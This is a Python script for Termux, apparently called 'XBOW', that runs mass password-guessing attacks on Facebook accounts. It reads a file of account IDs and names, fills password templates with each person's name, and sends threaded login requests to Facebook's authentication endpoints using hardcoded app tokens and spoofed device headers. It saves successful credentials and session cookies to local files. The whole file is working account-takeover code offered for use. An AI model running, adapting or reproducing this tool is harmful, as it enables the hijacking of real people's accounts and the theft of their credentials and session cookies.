import base64
import os
import random
import signal
import subprocess
import sys
import threading
import time
import uuid
import socket
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as inc3

LOCK_FILE = "/data/data/com.termux/files/home/.inc3"
if os.path.exists(LOCK_FILE):
    os.remove(LOCK_FILE)


def update_script():
    try:
        result = subprocess.run(["git", "pull"], capture_output=True, text=True)
        if "Already up to date" in result.stdout:
            pass
        else:
            subprocess.run(["git", "fetch", "--all"], check=True)
            subprocess.run(["git", "reset", "--hard", "origin/main"], check=True)
            subprocess.run(["git", "pull", "--force"], check=True)

            print("✅ Update successful! Run Again")
            sys.exit(1)

    except Exception as e:
        print(f"❌ Update failed! {e}")
        sys.exit(1)


os.system('clear')
print(f'Checking For Update....')
update_script()

os.system('clear')
print(f'Getting Modules....')

try:
    import psutil
except ModuleNotFoundError:
    subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    import psutil

try:
    import requests
except ModuleNotFoundError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)
    import requests


def reinstall_modules(modules):
    subprocess.run([sys.executable, "-m", "pip", "uninstall", "-y"] + modules, stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)

    subprocess.run([sys.executable, "-m", "pip", "install"] + modules, stdout=subprocess.DEVNULL,
                   stderr=subprocess.DEVNULL)


modules = ["requests", "chardet", "urllib3", "idna", "certifi"]
reinstall_modules(modules)

fast_work = ThreadPoolExecutor(max_workers=15).submit


def remove_lock_file(signum, frame):
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
        print('Exiting!')
    sys.exit(0)


def session_blocker():
    current_pid = os.getpid()
    with open(LOCK_FILE, "w") as f:
        f.write(str(current_pid))

    ###print(f"{current_pid}")

    try:
        while True:
            sessions = os.popen('pgrep -f "com.termux"').read().strip().split("\n")

            if len(sessions) > 1:
                for session in sessions:
                    if session.strip() and session != str(current_pid):
                        os.system(f"kill -9 {session}")

            time.sleep(1)
    except:
        remove_lock_file(None, None)


###### main #####


#########sys######

os.system('clear')
print(f'Loading Tool...')


def check_vpn():
    vpn_interfaces = ['tun', 'ppp', 'utun']
    for interface in psutil.net_if_addrs():
        if any(vpn in interface.lower() for vpn in vpn_interfaces):
            print("Turn Off VPN")
            sys.exit(1)


def check_network():
    try:
        socket.create_connection(('8.8.8.8', 53), timeout=5)
    except (socket.timeout, socket.gaierror, socket.error):
        print("Network connection error!")
        sys.exit(1)


check_vpn()
check_network()

# __________________[ LOOP ]__________________#
totaldmp = 0
count = 0
loop = 0
speed = 0
oks = []
cps = []
id = []
ps = []
sid = []
total = []
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop, ok, cp, user = 0, [], [], []
cok, plist = [], []


def clear(): os.system('clear');print(logo)


def linex(): print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')


# __________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; xbow \x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
        'viewport-width': '980'}

# __________________[ COLOUR ]__________________#
A = '\x1b[1;97m';
R = '\x1b[38;5;196m';
Y = '\033[1;33m';
M = '\x1b[38;5;205m';
B = '\x1b[38;5;8m';
G1 = '\x1b[38;5;46m';
G2 = '\x1b[38;5;47m';
G3 = '\x1b[38;5;48m';
G4 = '\x1b[38;5;49m';
G5 = '\x1b[38;5;50m';
X = '\33[1;34m';
X1 = '\x1b[38;5;14m';
X2 = '\x1b[38;5;123m';
X3 = '\x1b[38;5;122m';
X4 = '\x1b[38;5;86m';
X5 = '\x1b[38;5;121m';
S = '\x1b[1;96m';
G = '\x1b[38;5;48m'
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black = "\033[1;30m"
red = "\x1b[38;5;160m"
green = "\x1b[38;5;46m"
yelloww = "\033[1;33m"
blue = "\033[38;5;6m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white, blue, green];
warna = random.choice(my_color)
fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/e_value.json"


def get_ua():
    try:
        response = requests.get(fu, timeout=5)
        if response.status_code == 200:
            return response.text.strip().replace('"', '')
        else:
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        sys.exit(1)


e = get_ua()


def user_agent():
    s = "[FBAN/FB4A;FBAV/" + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(
        random.randint(111, 999)) + ";FBBV/" + str(random.randint(111111111, 999999999))
    if not e:
        sys.exit(1)
    ua = s + e
    return ua


# ━━━━━━━━━━━[ Version] ━━━━━━━━━━━

fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/ver.json"


def ver():
    try:
        response = requests.get(fu, timeout=5)
        if response.status_code == 200:
            return response.text.strip().replace('"', '')
        else:
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        sys.exit(1)


v = ver()

# ━━━━━━━━━━━[ Notice] ━━━━━━━━━━━

fu = "https://xbow-inc3-default-rtdb.asia-southeast1.firebasedatabase.app/user_agents/notice.json"


def Dark():
    try:
        response = requests.get(fu, timeout=5)
        if response.status_code == 200:
            return response.text.strip().replace('"', '')
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass


notice = Dark()
if notice == "null":
    pass
elif notice:
    os.system('clear')
    print(notice)
    sys.exit(1)


# __________________[Unitils]__________________#
def generate_udid(length=12):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(characters) for _ in range(length))


udid = generate_udid()

# __________________[ LOGO. ..]__________________#
logo = f"""
{white}X   X BBBB   OOO  W     W
{white} X X  B   B O   O W     W
{white}  X   BBBB  O   O W  W  W
{white} X X  B   B O   O  W W W
{white}X   X BBBB   OOO    W W        {green}{v}{white}
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{white}[{green}◆{white}] {white}FACEBOOK {white}➣{white}   ({green}clone.inception{white})
{white}[{green}◆{white}] {white}GITTEA   {white}➣{white}   ({green}inc3{white})
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""


# __________________[ RESULT ]__________________#
def result(OKs, cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        print(f'{white}[{green}◆{white}] {white}THE PROCESS HAS BEEN COMPLETED...')
        print(f'{white}[{green}◆{white}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
        print(f'{white}[{green}◆{white}] {green}TOTAL CP {white}➣{red} %s' % str(len(cps)))
        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
        input(f"{white}[{green}?{white}] {white}PRESS ENTER TO BACK MENU ")
        exit()


# __________________[ MENU ]__________________#
def menu():
    clear()
    print(f'[{white}1] {green}START FILE CLONE{white}')
    print(f'[{white}2] JOIN MESSENGER GROUP')
    print(f'[{white}3] CONTACT TOOL AUTHOR')
    print(f'[{white}0] {red}EXIT TOOL  ')
    linex()
    select = input(f'{white}[{green}?{white}] {white}CHOICE OPTION {white}➣{green} ')
    if select == '1':
        folder_name = "/sdcard/XBOW"
        if not os.path.exists(folder_name):
            os.makedirs(folder_name)
        _file_()
    elif select == '2':
        print(f'{red}Not Found{red}')
        time.sleep(2)
        # os.system('xdg-open https://chat.whatsapp.com/');
        menu()
    elif select == '3':
        os.system('xdg-open https://m.facebook.com/clone.inception');
        menu()
    elif select == '0':
        exit(f'{white}[{red}+{white}] See you again ')
    else:
        print(f'{white}[{red}!{white}] INVALID OPTION')
        time.sleep(1)
        menu()


def _file_():
    global methods, speed
    clear()

    print(f'{white}[{green}◆{white}] {white}METHOD - 1')
    print(f'{white}[{green}◆{white}] {white}METHOD - 2')
    linex()

    option = input(f'{white}[{green}?{white}] {white}CHOICE METHOD {white}➣{green} ')

    if option in ['1', '2']:
        try:
            speed = int(input(f'{white}[{green}?{white}] {white}ENTER CRACKING SPEED {white}➣{green} '))
        except ValueError:
            print(f'{white}[{red}!{white}] INVALID SPEED! ENTER A NUMBER.')
            time.sleep(2)
            return _file_()
        methods.append('methodA' if option == '1' else 'methodB')
        main_crack().crack(id)

    elif option == '0':
        _file_()
    else:
        print(f'{white}[{red}!{white}] INVALID METHOD')
        time.sleep(2)
        _file_()


class main_crack():
    def __init__(self):
        self.id = []

    def crack(self, id):
        global methods
        clear()
        print(f'{white}[{green}◆{white}] {white}Input File Path e.g. "/sdcard/1.txt"');
        linex()
        self.file = input(f'{white}[{green}?{white}]{white} File Path {white}➣{white} ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print(f'{red}[{red}+{red}] File Not Found ...')
            time.sleep(1)
            os.system('clear')
            print(logo)
            print(f'{red}[{red}+{red}] Input Correct File Path')
            time.sleep(1)
            main_crack().crack(id)

    def methodA(self, sid, name, psw, uuid):
        try:
            global oks, cps, loop
            sys.stdout.write(
                f"\r{white}[{white}XBOW-M1{white}]{white}-{white}[{white}{loop}{white}]{white}-{white}[{green}OK-{len(oks)}{white}]{white}[{black}CP-{len(cps)}{white}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                              ls).replace(
                    'Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {"adid": uuid,
                            "format": "json",
                            "device_id": uuid,
                            "email": sid,
                            "password": ps,
                            "generate_analytics_claim": "1",
                            "community_id": "",
                            "linked_guest_account_userid": "",
                            "cpl": "true",
                            "try_num": "1",
                            "family_device_id": uuid,
                            "secure_family_device_id": "95ea3bfe-07d8-4863-a520-4dbe79704e04",
                            "sim_serials": '["89014103211118510720"]',
                            "credentials_type": "password",
                            "openid_flow": "android_login",
                            "openid_provider": "google",
                            "openid_tokens": "[]",
                            "account_switcher_uids": '["' + sid + '"]',
                            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
                            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
                            "enroll_misauth": "false",
                            "generate_session_cookies": "1",
                            "error_detail_type": "button_with_disabled",
                            "source": "login",
                            "machine_id": "EvuAZ37kNVMnKcUo51EIB9uP",
                            "jazoest": "22610",
                            "meta_inf_fbmeta": "V2_UNTAGGED",
                            "advertiser_id": uuid,
                            "encrypted_msisdn": "",
                            "currently_logged_in_userid": "0",
                            "locale": "en_GB",
                            "client_country_code": "GB",
                            "fb_api_req_friendly_name": "authenticate",
                            "fb_api_caller_class": "Fb4aAuthHandler",
                            "api_key": "882a8490361da98702bf97a021ddc14d",
                            "sig": "214049b9f17c38bd767de53752b53946",
                            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                            }
                headers = {
                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-request-analytics-tags": '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
                    "x-fb-net-hni": str(random.randint(20000, 40000)),
                    "zero-rated": "0",
                    "x-fb-sim-hni": str(random.randint(20000, 40000)),
                    "x-fb-connection-quality": "EXCELLENT",
                    "x-fb-friendly-name": "authenticate",
                    "x-fb-connection-bandwidth": "78032897",
                    "x-tigon-is-retry": "False",
                    "user-agent": "Dalvik/2.1.0 (Linux; U; Android 9; 23113RKC6C Build/PQ3A.190705.08211809) ["
                                  "FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/480086274"
                                  ";FBCR/MobiFone"
                                  ";FBMF/Redmi;FBBD/Redmi;FBDV/23113RKC6C;FBSV/9;FBCA/x86:armeabi-v7a;FBDM/{"
                                  "density=1.5,"
                                  "width=1280,height=720};FB_FW/1;FBRV/0;]",
                    "authorization": "OAuth null",
                    "x-fb-connection-type": "WIFI",
                    "x-fb-device-group": "3342",
                    "priority": "u=3,i",
                    "x-fb-http-engine": "Liger",
                    "x-fb-client-ip": "True",
                    "x-fb-server-cluster": "True"
                }
                q = session.post("https://b-graph.facebook.com/auth/login", data=data, headers=headers,
                                 allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"]);
                    cookie = f"{ckkk}"
                    print(f"\r\r{white}[{green}XBOW-OK{white}] {green}{sid} {green}-{green} {ps} ")
                    print(f'\r\r{green}-[🤡]-{green} {cookie}''\n')
                    open('/sdcard/XBOW/XBOW-M1-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
                    open('/sdcard/XBOW/XBOW-CP.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                else:
                    continue
            loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.methodA(sid, name, ps)

    # __________________[ FILE METHOD M2 ]__________________#

    def methodB(self, sid, name, psw):
        try:
            global oks, cps, loop
            sys.stdout.write(
                f"\r{white}[{white}XBOW-M2{white}]{white}-{white}[{white}{loop}{white}]{white}-{white}[{green}OK-{len(oks)}{white}]{white}[{black}CP-{len(cps)}{white}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first', fs.lower()).replace('First', fs).replace('last', ls.lower()).replace('Last',
                                                                                                              ls).replace(
                    'Name', name).replace('name', name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
                            "format": "json",
                            "device_id": str(uuid.uuid4()),
                            "cpl": "true",
                            "family_device_id": str(uuid.uuid4()),
                            "credentials_type": "device_based_login_password",
                            "error_detail_type": "button_with_disabled",
                            "source": "device_based_login",
                            "email": sid,
                            "password": ps,
                            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                            "generate_session_cookies": "1",
                            "meta_inf_fbmeta": "",
                            "advertiser_id": str(uuid.uuid4()),
                            "currently_logged_in_userid": "0",
                            "locale": "en_GB",
                            "client_country_code": "GB",
                            "method": "auth.login",
                            "fb_api_req_friendly_name": "authenticate",
                            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                            "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': user_agent(),
                           'Content-Type': 'application/x-www-form-urlencoded',
                           'Host': 'graph.facebook.com',
                           'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                           'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                           'X-FB-Connection-Type': 'MOBILE.LTE',
                           'X-Tigon-Is-Retry': 'False',
                           'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                           'x-fb-device-group': '5120',
                           'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                           'X-FB-Request-Analytics-Tags': 'graphservice',
                           'X-FB-HTTP-Engine': 'Liger',
                           'X-FB-Client-IP': 'True',
                           'X-FB-Server-Cluster': 'True',
                           'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', }
                q = session.post("https://graph.facebook.com/auth/login", data=data, headers=headers,
                                 allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"]);
                    cookie = f"{ckkk}"
                    print(f"\r\r{white}[{green}XBOW-OK{white}] {green}{sid} {green}-{green} {ps} ")
                    print(f'\r\r{green}-[🤡]-{green} {cookie}''\n')
                    open('/sdcard/XBOW/XBOW-M2-COOKIE.txt', 'a').write(sid + '|' + ps + '|' + cookie + '\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
                    open('/sdcard/XBOW/XBOW-CP.txt', 'a').write(sid + '|' + ps + '\n')
                    cps.append(sid)
                else:
                    continue
            loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self.methodB(sid, name, ps)

        # __________________[ PASSWORD ]__________________#

    def pasw(self):
        pw = []
        global speed
        clear()

        try:
            print(f'{white}[{red}◆{white}] {red}Password Limit Should Not Be Greater Than 20!')
            linex()
            sl = int(input(f'{white}[{green}◆{white}] {white}Input Password Limit {white}➣{white} '))

            if sl <= 0 or sl > 20:
                print(f'{red} Password Limit Must Be Between 1 and 20!')
                return

            clear()
            print(f'{white}[{green}◆{white}] {white}EXAMPLE {white}➣{white} First123/first12/77889900')
            linex()

            for sr in range(sl):
                pw.append(input(f'{white}[{green}◆{white}] {white}Password {white}{sr + 1} {white}➣{white} '))

            clear()

            if not self.id:
                print(f'{red}❌ No UIDs found In File!')
                return

            print(f'{white}[{green}◆{white}] {white}TOTAL UID  {white}➣{green} %s ' % len(self.id))
            print(f'{white}[{green}◆{white}] {white}Use Automate {green}1M/3S{green} {white}Airplane Flow')
            linex()

            check_vpn()
            check_network()

            with inc3(max_workers=speed) as NOX:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        sz = name.split(' ')
                        if len(sz) in [3, 4, 5, 8]:
                            pwx = pw
                        else:
                            pwx = pw

                        if 'methodA' in methods:
                            NOX.submit(self.methodA, uid, name, pwx)
                        elif 'methodB' in methods:
                            NOX.submit(self.methodB, uid, name, pwx)
                        elif 'methodC' in methods:
                            NOX.submit(self.methodC, uid, name, pwx)
                        else:
                            print(f'{red}❌ No valid methods found for cracking.')
                            return
                    except Exception as e:
                        print(f'{red}❌ Error processing ID {zsb}: {e}')
                        pass

            result(oks, cps)

        except ValueError:
            print(f'{red}❌ Invalid input! Please enter a number between 1 and 20.')


def main():
    menu()


main()
